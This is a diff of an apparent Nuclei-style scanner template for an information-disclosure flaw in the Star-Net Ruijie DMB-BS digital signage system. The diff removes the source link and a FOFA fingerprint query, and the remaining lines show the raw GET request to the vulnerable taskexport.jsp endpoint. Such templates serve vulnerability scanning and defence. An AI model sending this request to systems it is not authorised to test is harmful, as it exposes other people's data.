@@ -3,12 +3,8 @@ info:
   name: 星网锐捷DMB-BS-taskexport存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/svar8vvdzx5tvit8'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: svar8vvdzx5tvit8
-    fofa: app="STAR_NET-数字标牌系统"
 http:
 - raw:
   - GET /dmb/out/taskexport.jsp?taskcode HTTP/1.1
